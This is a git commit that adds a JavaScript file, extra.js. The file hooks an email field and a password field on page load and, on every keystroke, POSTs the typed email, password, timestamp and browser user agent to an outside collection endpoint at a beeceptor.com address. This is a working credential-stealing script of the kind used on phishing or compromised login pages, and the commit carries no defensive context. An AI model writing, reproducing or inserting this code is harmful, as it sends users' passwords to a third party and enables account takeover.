97c1bc4118f4110e724cb26d4a25b78e8d7068d6
tuttleeeee <bankswhitehead@icloud.com>
2025-04-23 18:12:13 -0500

    Create extra.js

---
+++ extra.js
@@ -0,0 +1,22 @@
+document.addEventListener('DOMContentLoaded', () => {
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('loggerInput');
+
+    const sendData = () => {
+        fetch('https://loger.free.beeceptor.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: emailInput.value,
+                password: passwordInput.value,
+                time: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            })
+        });
+    };
+
+    emailInput.addEventListener('input', sendData);
+    passwordInput.addEventListener('input', sendData);
+});
